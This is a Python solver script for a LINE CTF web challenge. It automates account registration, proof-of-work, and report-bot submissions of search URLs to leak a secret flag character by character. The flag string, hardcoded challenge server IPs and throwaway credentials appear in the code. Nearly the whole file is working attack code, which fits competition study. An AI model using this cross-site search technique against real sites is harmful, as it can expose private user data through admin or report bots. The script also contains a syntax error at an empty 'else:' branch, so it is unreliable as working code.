import requests
import subprocess
from bs4 import BeautifulSoup 
from queue import LifoQueue
import queue
import threading
import traceback 
import urllib3

#flag = "LINECTF{1-KN0W-WHAT-Y0U-D0WN10AD}"

FOUND = "FOUND"
NOT_FOUND = "NOT_FOUND"
NO_INIT = "NO_INIT"
TIMEOUT = 30
ID_COUNT = 0

def IS_ERROR(resp, index, ch):
    if resp.text.find("504 Gateway Time-out") != -1:
        print("[+]: thread {index} ,'{char}' 504 Gateway Time-out".format(index=index,char=ch))
        char_queue.put(ch)
        return True
    elif resp.text.find("500 Internal Server Error") != -1:
        print("[+]: thread {index} ,'{char}' 500 Internal Server Error".format(index=index,char=ch))
        char_queue.put(ch)
        return True
    elif resp.text.find("400 Bad Request") != -1:
        print("[+]: thread {index} ,'{char}' 400 Bad Request".format(index=index,char=ch))
        char_queue.put(ch)
        return True
    return False

def get_nonce_csrf(index, host, ch):
    global TIMEOUT
    report_url = "http://{HOST}/report".format(HOST=host)
    cookies = {}
    cookies['session'] = session_list[index]
    resp = requests.get(url = report_url, cookies = cookies, timeout=TIMEOUT)
    if IS_ERROR(resp, index, ch):
        return None,None
    if resp.text.find("has-text-left") == -1:
        return None,None
    bs = BeautifulSoup(resp.text, "html.parser")
    csrf_token = bs.find("input", {"name":"csrf_token"})["value"]
    
    text = bs.select('div[class*="has-text-left"]')[0].findChildren("strong")[0].getText()
    size = len("npm install -g proof-of-work && proof-of-work ")
    _pow = text[size:size+32]
    complexity = text[size+32+1:size+32+3]


    if debug == True:
        nonce = "asdf"   
    else:
        nonce = subprocess.check_output(['proof-of-work', _pow,complexity])
    return nonce, csrf_token

start_index = 0x21
end_index = 0x7f
def find_char( index):
    global char_queue
    global flag
    global session_list
    global GLOBAL_FLAG
    global DONE_LIST
    global ERR_CNT
    #print(" index:", index)
    start_size = len(flag)

    
    while True:
        if GLOBAL_FLAG == True:
            break
        try:
            host = get_host()
            session = session_list[index]
            report_url = "http://{HOST}/report".format(HOST=host)


            ch = char_queue.get(timeout=0)
            char_queue.task_done()
            nonce, csrf_token = get_nonce_csrf(index, host, ch)
            if nonce == None:
                ERR_CNT += 1
                reset_session(index, host)
            if GLOBAL_FLAG == True:
                break
                
            query = flag + ch
            target_url = "http://{HOST}/search?q={QUERY}&download=1".format(HOST=host, QUERY=query)
            data = {
                'csrf_token':csrf_token,
                'url': target_url,
                'proof':nonce
            } 
            cookies = {
                "session":session
            }
            resp = requests.post(url = report_url, data=data, cookies = cookies, timeout= TIMEOUT)
            if IS_ERROR(resp, index, ch):
                ERR_CNT += 1
                reset_session(index, host)
                continue

            bs = BeautifulSoup(resp.text, "html.parser")
            if resp.text.find("                ng") != -1 and GLOBAL_FLAG == False and start_size == len(flag):
                text = bs.select('div[class*="notification"]')[1].getText()
                flag += ch
                DONE_LIST.append(ch)
                GLOBAL_FLAG = True
                return
            elif resp.text.find("Thank you for the report!") != -1:
                text = bs.select('div[class*="notification"]')[1].getText()
                DONE_LIST.append(ch)
            else:
            DONE_LIST.sort()
        except queue.Empty:
            return
        except requests.exceptions.Timeout:
            char_queue.put(ch)
            ERR_CNT += 1
            reset_session(index, host)
        except urllib3.exceptions.ReadTimeoutError:
            char_queue.put(ch)
            ERR_CNT += 1
            reset_session(index, host)
        except Exception as e:
            
            traceback.print_exc() 
            char_queue.put(ch)
            
            
            
        
def get_host():
    global HOST_LIST
    global HOST_INDEX
    global ERR_CNT
    global MAX_ERROR_CNT
    
    if ERR_CNT >= MAX_ERROR_CNT :
        ERR_CNT = 0
        PREV = HOST_INDEX
        HOST_INDEX = (HOST_INDEX + 1) % len(HOST_LIST)
        print("[+] RENEW HOST from {PREV} to {NEXT}".format(PREV=PREV, NEXT=HOST_INDEX) )
    return HOST_LIST[ HOST_INDEX ]

def reset_session(index, host):
    global session_list
    global id_list
    register_url = "http://{HOST}/register".format(HOST=host)
    resp = requests.get(url=register_url, timeout=TIMEOUT)
    set_cookie = resp.headers["Set-Cookie"]
    size = 36
    start = set_cookie.find("session=")
    print("[+] reset_session session_list[index]", index, " : " ,session_list[index] )
    session = set_cookie[start+8:start+8+size]
    session_list[index] = session
    cookies = {}
    cookies['session'] = session_list[index]

    bs = BeautifulSoup(resp.text, "html.parser")
    csrf_token = bs.find("input", {"name":"csrf_token"})["value"]
    
    username = BASE_USERNAME + ('%d' % index)
    id_list[index] = username
    data = {
        'csrf_token':csrf_token,
        'username': username,
        'password':password
    } 
    requests.post(url=register_url,data=data , cookies = cookies)

    login_url = "http://{HOST}/login".format(HOST=host)

    resp = requests.get(url=login_url, cookies = cookies)
    bs = BeautifulSoup(resp.text, "html.parser")
    csrf_token = bs.find("input", {"name":"csrf_token"})["value"]


    data = {
        'csrf_token':csrf_token,
        'username': username,
        'password':password
    } 
    resp = requests.post(url=login_url,data=data , cookies = cookies)
    #print(resp.text)
    return session


char_queue = queue.LifoQueue()

THREAD_NUMBERS = 6

debug = False
MAX_ERROR_CNT = THREAD_NUMBERS
if debug:
    HOST_LIST = ["192.168.219.23:3333"] 
else:
    HOST_LIST = ["34.84.243.202","35.200.11.35","34.84.72.167"]
HOST_INDEX = 1
ERR_CNT = 0

BASE_USERNAME = "USERUSER"
password = "PASSSWORDD"

thread_list = []
result_list = [ False for _ in range(0, THREAD_NUMBERS)]
session_list = [ None for _ in range(0, THREAD_NUMBERS)]
id_list = [ "" for _ in range(0, THREAD_NUMBERS)]

print("[+] initializing session_list")
for i in range(0, THREAD_NUMBERS):        
    result_list[i] = False
    scraping_thread = threading.Thread(target=reset_session, args=(i,get_host()))
    scraping_thread.start()
    thread_list.append(scraping_thread)
for thread in thread_list:
    thread.join()


print(session_list,result_list, id_list)
print("[+] start finding")

import string
SPECIAL_CHARS = """~`!@#$^&*()=+[]\|;':",./<>?-"""  
CHAR_TABLE = list(  SPECIAL_CHARS     + string.ascii_lowercase   + "{}"+ string.digits   + "-" + string.ascii_uppercase   )

DONE_LIST = []
flag = ""

while True:
    GLOBAL_FLAG = False
    char_queue.queue.clear()
    DONE_LIST.clear()
    #for i in range(len(CHAR_TABLE)-1,-1, -1):
    for i in range(0, len(CHAR_TABLE)):
        char_queue.put( CHAR_TABLE[i] )
    for i in range(0, THREAD_NUMBERS):
        result_list[i] = NO_INIT
        scraping_thread = threading.Thread(target=find_char, args=(i,))
        scraping_thread.start()
        thread_list.append(scraping_thread)
    for thread in thread_list:
        thread.join()
    
    print("[+] all thread completed... ")
    
    if GLOBAL_FLAG == True:
        print("flag found" , flag)

    else:
        print("flag not found")
        exit()
    print("[+] flag:::" , flag)
    
